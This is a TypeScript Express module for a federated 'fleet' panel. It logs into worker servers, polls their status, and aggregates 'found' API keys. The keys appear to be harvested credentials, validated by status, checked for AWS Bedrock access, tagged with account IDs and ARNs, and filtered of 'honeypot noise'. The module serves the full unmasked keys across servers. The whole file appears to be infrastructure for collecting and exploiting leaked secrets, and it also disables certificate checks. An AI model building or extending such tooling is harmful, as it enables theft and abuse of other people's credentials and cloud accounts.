/**
 * KMON Fleet — federated multi-server panel
 *
 * Architecture:
 *   - Main panel stores fleet_config.json with slave server URLs + passwords
 *   - Background worker polls slaves (status 10s, stats 30s, keys 60s)
 *   - All results served from in-memory cache (fast, no local DB)
 *   - Slaves can register a master → show FEDERATED indicator in UI
 */

import { Router } from "express";
import fs from "fs";
import path from "path";
import https from "node:https";
import http from "node:http";
import { fileURLToPath } from "url";
import { randomUUID } from "crypto";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const MONITOR_DIR = path.resolve(__dirname, "../../../monitor");
const DATA_DIR    = path.join(MONITOR_DIR, "data");

const FLEET_CONFIG_FILE       = path.join(DATA_DIR, "fleet_config.json");
const FLEET_REGISTRATION_FILE = path.join(DATA_DIR, "fleet_registration.json");

// ── Types ─────────────────────────────────────────────────────────────────────

interface FleetServer {
  id: string;
  name: string;
  url: string;           // e.g. http://1.2.3.4:32423
  password: string;
  enabled: boolean;
  addedAt: string;
}

interface FleetConfig {
  enabled: boolean;      // Is this the main panel?
  servers: FleetServer[];
}

interface ServerStats {
  keysFound: number;
  keysValid: number;
  keysUnchecked: number;
  keysInvalid: number;
  keysWithBedrock: number;
  serviceBreakdown: Record<string, number>;
}

interface ServerStatus {
  running: boolean;
  currentAction: string;
  cycleInProgress: boolean;
  cycleProgress?: { done: number; total: number; etaSeconds: number | null };
  autoChainPhase?: string;
  autoChainMessage?: string;
}

interface SysInfo {
  cpus: number;
  loadAvg: number[];
  memTotal: number;
  memAvail: number;
}

interface CachedKey {
  id: string;
  serverId: string;
  serverName: string;
  type: string;
  key?: string | null;
  keyMasked?: string | null;
  service?: string | null;
  category?: string | null;
  status: string;
  firstSeenAt: string;
  validatedAt?: string | null;
  awsBedrockAccess?: boolean;
  awsAccountId?: string | null;
  awsArn?: string | null;
  source: string;
  url?: string;
}

interface ServerCacheEntry {
  id: string;
  name: string;
  url: string;
  online: boolean;
  lastSeenAt: number | null;
  lastError: string | null;
  stats: ServerStats | null;
  status: ServerStatus | null;
  sysInfo: SysInfo | null;
  recentKeys: CachedKey[];
  // timestamps for throttling
  lastStatusAt: number;
  lastStatsAt: number;
  lastKeysAt: number;
}

interface FleetRegistration {
  masterUrl: string;
  masterName: string;
  registeredAt: string;
}

// ── Config helpers ─────────────────────────────────────────────────────────────

function readFleetConfig(): FleetConfig {
  try {
    return JSON.parse(fs.readFileSync(FLEET_CONFIG_FILE, "utf-8")) as FleetConfig;
  } catch {
    return { enabled: false, servers: [] };
  }
}

function writeFleetConfig(cfg: FleetConfig): void {
  fs.mkdirSync(DATA_DIR, { recursive: true });
  fs.writeFileSync(FLEET_CONFIG_FILE, JSON.stringify(cfg, null, 2));
}

function readFleetRegistration(): FleetRegistration | null {
  try {
    return JSON.parse(fs.readFileSync(FLEET_REGISTRATION_FILE, "utf-8")) as FleetRegistration;
  } catch {
    return null;
  }
}

function writeFleetRegistration(reg: FleetRegistration | null): void {
  fs.mkdirSync(DATA_DIR, { recursive: true });
  if (reg === null) {
    try { fs.unlinkSync(FLEET_REGISTRATION_FILE); } catch { /* ignore */ }
  } else {
    fs.writeFileSync(FLEET_REGISTRATION_FILE, JSON.stringify(reg, null, 2));
  }
}

// ── In-memory cache ────────────────────────────────────────────────────────────

const _cache = new Map<string, ServerCacheEntry>();
const _sessionCookies = new Map<string, string>(); // serverId → cookie value

function getOrCreateCacheEntry(server: FleetServer): ServerCacheEntry {
  if (!_cache.has(server.id)) {
    _cache.set(server.id, {
      id: server.id, name: server.name, url: server.url,
      online: false, lastSeenAt: null, lastError: null,
      stats: null, status: null, sysInfo: null, recentKeys: [],
      lastStatusAt: 0, lastStatsAt: 0, lastKeysAt: 0,
    });
  }
  return _cache.get(server.id)!;
}

// ── HTTP helpers ───────────────────────────────────────────────────────────────

function fetchUrl(
  urlStr: string,
  opts: {
    method?: string;
    headers?: Record<string, string>;
    body?: string;
    timeoutMs?: number;
  } = {},
): Promise<{ status: number; body: string; headers: Record<string, string> }> {
  return new Promise((resolve, reject) => {
    const parsed = new URL(urlStr);
    const isHttps = parsed.protocol === "https:";
    const lib = isHttps ? https : http;
    const bodyBuf = opts.body ? Buffer.from(opts.body, "utf-8") : null;

    const reqOpts = {
      hostname: parsed.hostname,
      port: parsed.port || (isHttps ? "443" : "80"),
      path: parsed.pathname + parsed.search,
      method: opts.method ?? "GET",
      headers: {
        "User-Agent": "KMON-Fleet/1.0",
        ...(bodyBuf ? { "Content-Type": "application/json", "Content-Length": String(bodyBuf.length) } : {}),
        ...(opts.headers ?? {}),
      },
      timeout: opts.timeoutMs ?? 10000,
      // Allow self-signed certs on LAN servers
      rejectUnauthorized: false,
    };

    const resHeaders: Record<string, string> = {};
    const req = (lib as typeof https).request(reqOpts, (res) => {
      const chunks: Buffer[] = [];
      Object.entries(res.headers).forEach(([k, v]) => {
        if (typeof v === "string") resHeaders[k] = v;
        else if (Array.isArray(v)) resHeaders[k] = v.join("; ");
      });
      res.on("data", (c: Buffer) => chunks.push(c));
      res.on("end", () =>
        resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf-8"), headers: resHeaders }),
      );
    });
    req.on("timeout", () => { req.destroy(); reject(new Error("timeout")); });
    req.on("error", (e) => reject(e));
    if (bodyBuf) req.write(bodyBuf);
    req.end();
  });
}

// ── Auth per server ────────────────────────────────────────────────────────────

async function loginToServer(server: FleetServer): Promise<string | null> {
  try {
    const resp = await fetchUrl(`${server.url}/api/auth/login`, {
      method: "POST",
      body: JSON.stringify({ password: server.password }),
      headers: { "Content-Type": "application/json" },
      timeoutMs: 8000,
    });
    if (resp.status !== 200) return null;
    // Extract kmon_auth cookie from Set-Cookie header
    const setCookie = resp.headers["set-cookie"] ?? "";
    const match = /kmon_auth=([^;]+)/.exec(setCookie);
    return match ? match[1] : null;
  } catch {
    return null;
  }
}

async function apiFetch(
  server: FleetServer,
  apiPath: string,
  opts: { method?: string; body?: string; retryAuth?: boolean } = {},
): Promise<{ status: number; data: unknown } | null> {
  const cookie = _sessionCookies.get(server.id) ?? "";
  const url = `${server.url}${apiPath}`;

  try {
    const resp = await fetchUrl(url, {
      method: opts.method ?? "GET",
      headers: { Cookie: `kmon_auth=${cookie}` },
      body: opts.body,
      timeoutMs: 12000,
    });

    // If unauthorized, re-login once
    if (resp.status === 401 && opts.retryAuth !== false) {
      const newCookie = await loginToServer(server);
      if (newCookie) {
        _sessionCookies.set(server.id, newCookie);
        return apiFetch(server, apiPath, { ...opts, retryAuth: false });
      }
      return null;
    }

    if (resp.status >= 200 && resp.status < 300) {
      try { return { status: resp.status, data: JSON.parse(resp.body) }; }
      catch { return { status: resp.status, data: resp.body }; }
    }
    return null;
  } catch {
    return null;
  }
}

// ── Cache updaters ─────────────────────────────────────────────────────────────

async function updateServerStatus(server: FleetServer): Promise<void> {
  const entry = getOrCreateCacheEntry(server);
  entry.lastStatusAt = Date.now();

  try {
    // Health check (no auth needed)
    const health = await fetchUrl(`${server.url}/api/healthz`, { timeoutMs: 5000 });
    entry.online = health.status === 200;
    if (entry.online) entry.lastSeenAt = Date.now();
    entry.lastError = entry.online ? null : `HTTP ${health.status}`;
  } catch (e) {
    entry.online = false;
    entry.lastError = (e as Error).message ?? "unreachable";
    return;
  }

  if (!entry.online) return;

  // Fetch monitor status
  const [statusRes, chainRes] = await Promise.all([
    apiFetch(server, "/api/monitor/status"),
    apiFetch(server, "/api/monitor/auto-chain/status"),
  ]);

  if (statusRes) {
    const d = statusRes.data as Record<string, unknown>;
    entry.status = {
      running: Boolean(d.running),
      currentAction: String(d.currentAction ?? ""),
      cycleInProgress: Boolean(d.cycleInProgress),
      cycleProgress: d.cycleProgress as ServerStatus["cycleProgress"],
    };
    if (chainRes) {
      const cd = chainRes.data as Record<string, unknown>;
      entry.status.autoChainPhase = String(cd.phase ?? "");
      entry.status.autoChainMessage = String(cd.message ?? "");
    }
  }

  // Fetch sysinfo
  const sysRes = await apiFetch(server, "/api/monitor/sysinfo");
  if (sysRes) {
    entry.sysInfo = sysRes.data as SysInfo;
  }
}

async function updateServerStats(server: FleetServer): Promise<void> {
  const entry = getOrCreateCacheEntry(server);
  if (!entry.online) return;
  entry.lastStatsAt = Date.now();

  const statsRes = await apiFetch(server, "/api/monitor/stats");
  if (statsRes) {
    const d = statsRes.data as Record<string, unknown>;
    entry.stats = {
      keysFound:       Number(d.keysFound      ?? 0),
      keysValid:       Number(d.keysValid       ?? 0),
      keysUnchecked:   Number(d.keysUnchecked   ?? 0),
      keysInvalid:     Number(d.keysInvalid     ?? 0),
      keysWithBedrock: Number(d.keysWithBedrock ?? 0),
      serviceBreakdown: (d.serviceBreakdown as Record<string, number>) ?? {},
    };
  }
}

async function updateServerKeys(server: FleetServer): Promise<void> {
  const entry = getOrCreateCacheEntry(server);
  if (!entry.online) return;
  entry.lastKeysAt = Date.now();

  // Fetch valid + unchecked (skip invalid/error/honeypot noise)
  const params = new URLSearchParams({
    export: "1", type: "keys", limit: "500",
    status: "valid",
  });
  const validRes = await apiFetch(server, `/api/monitor/results?${params}`);

  const uncheckedParams = new URLSearchParams({
    export: "1", type: "keys", limit: "200",
    status: "unchecked",
  });
  const uncheckedRes = await apiFetch(server, `/api/monitor/results?${uncheckedParams}`);

  const validKeys: CachedKey[] = [];
  const toKey = (r: Record<string, unknown>): CachedKey => ({
    id: String(r.id ?? ""),
    serverId: server.id,
    serverName: server.name,
    type: String(r.type ?? "key"),
    key: r.key as string | null,
    keyMasked: r.keyMasked as string | null,
    service: r.service as string | null,
    category: r.category as string | null,
    status: String(r.status ?? "unchecked"),
    firstSeenAt: String(r.firstSeenAt ?? ""),
    validatedAt: r.validatedAt as string | null,
    awsBedrockAccess: Boolean(r.awsBedrockAccess),
    awsAccountId: r.awsAccountId as string | null,
    awsArn: r.awsArn as string | null,
    source: String(r.source ?? ""),
    url: r.url as string | undefined,
  });

  if (validRes) {
    const d = validRes.data as { items?: Record<string, unknown>[] };
    (d.items ?? []).forEach((r) => validKeys.push(toKey(r)));
  }
  if (uncheckedRes) {
    const d = uncheckedRes.data as { items?: Record<string, unknown>[] };
    (d.items ?? []).forEach((r) => validKeys.push(toKey(r)));
  }

  // Deduplicate by id
  const seen = new Set<string>();
  entry.recentKeys = validKeys.filter((k) => {
    if (seen.has(k.id)) return false;
    seen.add(k.id); return true;
  });
}

// ── Background worker ─────────────────────────────────────────────────────────

let _workerTimer: ReturnType<typeof setInterval> | null = null;
let _workerTick = 0;

async function workerTick(): Promise<void> {
  _workerTick++;
  const cfg = readFleetConfig();
  if (!cfg.enabled || cfg.servers.length === 0) return;

  const activeServers = cfg.servers.filter((s) => s.enabled);
  const now = Date.now();

  await Promise.all(
    activeServers.map(async (server) => {
      const entry = getOrCreateCacheEntry(server);

      // Status + sysinfo: every ~10s (every tick)
      if (now - entry.lastStatusAt >= 9000) {
        await updateServerStatus(server);
      }

      // Stats: every ~30s (every 3 ticks)
      if (_workerTick % 3 === 0 || now - entry.lastStatsAt >= 29000) {
        await updateServerStats(server);
      }

      // Keys: every ~60s (every 6 ticks)
      if (_workerTick % 6 === 0 || now - entry.lastKeysAt >= 59000) {
        await updateServerKeys(server);
      }
    }),
  );
}

function startFleetWorker(): void {
  if (_workerTimer) return;
  // Initial immediate run
  void workerTick();
  _workerTimer = setInterval(() => { void workerTick(); }, 10000);
  console.log("[fleet] Background worker started (10s interval)");
}

function stopFleetWorker(): void {
  if (_workerTimer) { clearInterval(_workerTimer); _workerTimer = null; }
}

// Restart worker when config changes
function restartWorkerIfEnabled(): void {
  stopFleetWorker();
  const cfg = readFleetConfig();
  if (cfg.enabled && cfg.servers.some((s) => s.enabled)) {
    startFleetWorker();
  }
}

// ── Router ─────────────────────────────────────────────────────────────────────

export function buildFleetRouter(): Router {
  // Start worker if fleet was previously enabled
  restartWorkerIfEnabled();

  const router = Router();

  // ── Fleet config ────────────────────────────────────────────────────────────

  // GET /fleet/config — read fleet config (passwords redacted)
  router.get("/config", (_req, res) => {
    const cfg = readFleetConfig();
    res.json({
      enabled: cfg.enabled,
      servers: cfg.servers.map((s) => ({
        ...s,
        password: s.password ? "••••••••" : "",
      })),
    });
  });

  // PATCH /fleet/config — toggle enabled
  router.patch("/config", (req, res) => {
    const body = req.body as { enabled?: boolean };
    const cfg = readFleetConfig();
    if (typeof body.enabled === "boolean") cfg.enabled = body.enabled;
    writeFleetConfig(cfg);
    restartWorkerIfEnabled();
    res.json({ enabled: cfg.enabled });
  });

  // POST /fleet/servers — add server
  router.post("/servers", (req, res) => {
    const body = req.body as { name?: string; url?: string; password?: string };
    if (!body.url || !body.password) {
      res.status(400).json({ error: "url and password required" });
      return;
    }
    const cfg = readFleetConfig();
    const server: FleetServer = {
      id: `srv_${randomUUID().replace(/-/g, "").slice(0, 12)}`,
      name: (body.name ?? body.url).trim(),
      url: body.url.replace(/\/$/, ""),
      password: body.password,
      enabled: true,
      addedAt: new Date().toISOString(),
    };
    cfg.servers.push(server);
    writeFleetConfig(cfg);
    restartWorkerIfEnabled();
    res.json({ ...server, password: "••••••••" });
  });

  // PUT /fleet/servers/:id — update server
  router.put("/servers/:id", (req, res) => {
    const { id } = req.params;
    const body = req.body as Partial<FleetServer>;
    const cfg = readFleetConfig();
    const idx = cfg.servers.findIndex((s) => s.id === id);
    if (idx === -1) { res.status(404).json({ error: "Server not found" }); return; }
    const existing = cfg.servers[idx];
    cfg.servers[idx] = {
      ...existing,
      name: body.name ?? existing.name,
      url: (body.url ?? existing.url).replace(/\/$/, ""),
      password: body.password && body.password !== "••••••••" ? body.password : existing.password,
      enabled: body.enabled ?? existing.enabled,
    };
    writeFleetConfig(cfg);
    // Clear cached session if password changed
    if (body.password && body.password !== "••••••••") _sessionCookies.delete(id);
    restartWorkerIfEnabled();
    res.json({ ...cfg.servers[idx], password: "••••••••" });
  });

  // DELETE /fleet/servers/:id
  router.delete("/servers/:id", (req, res) => {
    const { id } = req.params;
    const cfg = readFleetConfig();
    cfg.servers = cfg.servers.filter((s) => s.id !== id);
    writeFleetConfig(cfg);
    _cache.delete(id);
    _sessionCookies.delete(id);
    restartWorkerIfEnabled();
    res.json({ success: true });
  });

  // POST /fleet/servers/:id/test — test connection
  router.post("/servers/:id/test", async (req, res) => {
    const { id } = req.params;
    const cfg = readFleetConfig();
    const server = cfg.servers.find((s) => s.id === id);
    if (!server) { res.status(404).json({ error: "Server not found" }); return; }

    try {
      const health = await fetchUrl(`${server.url}/api/healthz`, { timeoutMs: 6000 });
      if (health.status !== 200) {
        res.json({ ok: false, error: `HTTP ${health.status}` });
        return;
      }
      const cookie = await loginToServer(server);
      if (!cookie) {
        res.json({ ok: false, error: "Auth failed — check password" });
        return;
      }
      _sessionCookies.set(server.id, cookie);
      // Fetch stats to confirm API works
      const statsResp = await apiFetch(server, "/api/monitor/stats");
      if (statsResp) {
        const d = statsResp.data as Record<string, unknown>;
        res.json({ ok: true, keysFound: d.keysFound ?? 0, keysValid: d.keysValid ?? 0 });
      } else {
        res.json({ ok: false, error: "API unreachable after auth" });
      }
    } catch (e) {
      res.json({ ok: false, error: (e as Error).message });
    }
  });

  // POST /fleet/servers/:id/refresh — force cache refresh for one server
  router.post("/servers/:id/refresh", async (req, res) => {
    const { id } = req.params;
    const cfg = readFleetConfig();
    const server = cfg.servers.find((s) => s.id === id);
    if (!server) { res.status(404).json({ error: "Server not found" }); return; }
    await Promise.all([
      updateServerStatus(server),
      updateServerStats(server),
      updateServerKeys(server),
    ]);
    res.json({ ok: true });
  });

  // ── Fleet data ──────────────────────────────────────────────────────────────

  // GET /fleet/servers/status — all servers with cached status
  router.get("/servers/status", (_req, res) => {
    const cfg = readFleetConfig();
    const result = cfg.servers.map((s) => {
      const entry = _cache.get(s.id);
      return {
        id: s.id,
        name: s.name,
        url: s.url,
        enabled: s.enabled,
        addedAt: s.addedAt,
        online: entry?.online ?? false,
        lastSeenAt: entry?.lastSeenAt ?? null,
        lastError: entry?.lastError ?? null,
        stats: entry?.stats ?? null,
        status: entry?.status ?? null,
        sysInfo: entry?.sysInfo ?? null,
        keysInCache: entry?.recentKeys.length ?? 0,
      };
    });
    res.json({ enabled: cfg.enabled, servers: result });
  });

  // GET /fleet/results — aggregated keys from all server caches
  router.get("/results", (req, res) => {
    const page   = Math.max(1, parseInt(String(req.query.page  ?? "1")));
    const limit  = Math.min(100, Math.max(1, parseInt(String(req.query.limit ?? "50"))));
    const statusFilter   = String(req.query.status   ?? "all");
    const serviceFilter  = String(req.query.service  ?? "");
    const categoryFilter = String(req.query.category ?? "");
    const serverFilter   = String(req.query.server   ?? "");
    const bedrockOnly    = req.query.bedrock === "1";
    const keySearch      = String(req.query.keySearch ?? "").trim().toLowerCase();

    // Merge all cached keys
    let all: CachedKey[] = [];
    const cfg = readFleetConfig();
    for (const srv of cfg.servers) {
      if (!srv.enabled) continue;
      const entry = _cache.get(srv.id);
      if (entry) all.push(...entry.recentKeys);
    }

    // Apply filters
    if (serverFilter)   all = all.filter((k) => k.serverId === serverFilter);
    if (statusFilter !== "all")  all = all.filter((k) => k.status === statusFilter);
    if (serviceFilter  && serviceFilter  !== "all") all = all.filter((k) => k.service  === serviceFilter);
    if (categoryFilter && categoryFilter !== "all") all = all.filter((k) => k.category === categoryFilter);
    if (bedrockOnly)    all = all.filter((k) => k.awsBedrockAccess === true);
    if (keySearch)      all = all.filter((k) =>
      String(k.key ?? k.keyMasked ?? "").toLowerCase().includes(keySearch) ||
      String(k.url ?? "").toLowerCase().includes(keySearch)
    );

    // Global dedup by key fingerprint (same key found on multiple servers → keep newest)
    const deduped = new Map<string, CachedKey>();
    for (const k of all) {
      const existing = deduped.get(k.id);
      if (!existing || (k.firstSeenAt > existing.firstSeenAt)) {
        deduped.set(k.id, k);
      }
    }

    let items = [...deduped.values()];
    // Sort newest first
    items.sort((a, b) => b.firstSeenAt.localeCompare(a.firstSeenAt));

    const total = items.length;
    const pages = Math.ceil(total / limit) || 1;
    items = items.slice((page - 1) * limit, page * limit);

    res.json({ items, total, page, pages, limit });
  });

  // GET /fleet/stats — aggregated stats across all servers
  router.get("/stats", (_req, res) => {
    const cfg = readFleetConfig();
    let keysFound = 0, keysValid = 0, keysUnchecked = 0, keysInvalid = 0, keysWithBedrock = 0;
    const serviceBreakdown: Record<string, number> = {};
    let serversOnline = 0;

    for (const srv of cfg.servers) {
      if (!srv.enabled) continue;
      const entry = _cache.get(srv.id);
      if (!entry) continue;
      if (entry.online) serversOnline++;
      if (entry.stats) {
        keysFound       += entry.stats.keysFound;
        keysValid       += entry.stats.keysValid;
        keysUnchecked   += entry.stats.keysUnchecked;
        keysInvalid     += entry.stats.keysInvalid;
        keysWithBedrock += entry.stats.keysWithBedrock;
        for (const [svc, cnt] of Object.entries(entry.stats.serviceBreakdown)) {
          serviceBreakdown[svc] = (serviceBreakdown[svc] ?? 0) + cnt;
        }
      }
    }

    res.json({
      enabled: cfg.enabled,
      totalServers: cfg.servers.filter((s) => s.enabled).length,
      serversOnline,
      keysFound, keysValid, keysUnchecked, keysInvalid, keysWithBedrock,
      serviceBreakdown,
    });
  });

  // GET /fleet/live-feed — newest keys across all servers (no pagination, just top 50)
  router.get("/live-feed", (_req, res) => {
    const cfg = readFleetConfig();
    const all: CachedKey[] = [];
    for (const srv of cfg.servers) {
      if (!srv.enabled) continue;
      const entry = _cache.get(srv.id);
      if (entry?.online) all.push(...entry.recentKeys.slice(0, 20));
    }
    all.sort((a, b) => b.firstSeenAt.localeCompare(a.firstSeenAt));
    res.json(all.slice(0, 50));
  });

  // GET /fleet/results/:serverId/:keyId — proxy detail request to specific slave
  router.get("/results/:serverId/:keyId", async (req, res) => {
    const { serverId, keyId } = req.params;
    if (!/^[0-9a-f]{24,64}$/.test(keyId)) {
      res.status(400).json({ error: "Invalid key id" });
      return;
    }
    const cfg = readFleetConfig();
    const server = cfg.servers.find((s) => s.id === serverId);
    if (!server) { res.status(404).json({ error: "Server not found" }); return; }

    const result = await apiFetch(server, `/api/monitor/results/${keyId}`);
    if (result) {
      res.json({ ...(result.data as object), _serverId: serverId, _serverName: server.name });
    } else {
      res.status(404).json({ error: "Not found on remote server" });
    }
  });

  // ── Slave registration (called by main panel on slave, or manually) ──────────

  // POST /fleet/register — slave receives this from main panel
  router.post("/register", (req, res) => {
    const body = req.body as { masterUrl?: string; masterName?: string };
    if (!body.masterUrl) {
      res.status(400).json({ error: "masterUrl required" });
      return;
    }
    const reg: FleetRegistration = {
      masterUrl: body.masterUrl,
      masterName: body.masterName ?? "Main Panel",
      registeredAt: new Date().toISOString(),
    };
    writeFleetRegistration(reg);
    res.json({ success: true, message: "Registered as fleet member" });
  });

  // DELETE /fleet/register — remove registration
  router.delete("/register", (_req, res) => {
    writeFleetRegistration(null);
    res.json({ success: true });
  });

  // GET /fleet/registration — UI polls this to show slave indicator
  router.get("/registration", (_req, res) => {
    const reg = readFleetRegistration();
    res.json(reg ?? { masterUrl: null });
  });

  // POST /fleet/servers/:id/register-on-slave — tell a slave it's federated
  router.post("/servers/:id/register-on-slave", async (req, res) => {
    const { id } = req.params;
    const body = req.body as { masterUrl?: string; masterName?: string };
    const cfg = readFleetConfig();
    const server = cfg.servers.find((s) => s.id === id);
    if (!server) { res.status(404).json({ error: "Server not found" }); return; }

    try {
      const result = await apiFetch(server, "/api/fleet/register", {
        method: "POST",
        body: JSON.stringify({ masterUrl: body.masterUrl ?? "", masterName: body.masterName ?? "Main Panel" }),
      });
      if (result) {
        res.json({ success: true });
      } else {
        res.status(502).json({ error: "Failed to register on slave" });
      }
    } catch (e) {
      res.status(500).json({ error: (e as Error).message });
    }
  });

  // POST /fleet/force-refresh — force full refresh of all server caches
  router.post("/force-refresh", async (_req, res) => {
    const cfg = readFleetConfig();
    _workerTick = 0; // Reset tick so all intervals fire
    await Promise.all(
      cfg.servers.filter((s) => s.enabled).map(async (server) => {
        await updateServerStatus(server);
        await updateServerStats(server);
        await updateServerKeys(server);
      }),
    );
    res.json({ ok: true, servers: cfg.servers.length });
  });

  return router;
}
